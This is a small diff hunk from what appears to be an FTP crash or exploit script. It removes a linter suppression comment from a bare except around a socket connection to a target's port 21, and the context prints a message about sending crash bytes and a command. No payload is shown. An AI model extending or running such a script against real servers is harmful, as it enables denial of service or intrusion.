@@ -50,7 +50,7 @@ def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((target, 21))
-    except:  # pylint: disable=bare-except  # noqa: E722
+    except:  # pylint: disable=bare-except
         print(f'[-] Connection to {target} failed!')
         sys.exit(0)
     print(f'[+] sending {len(crash)} + {command} bytes crash...')
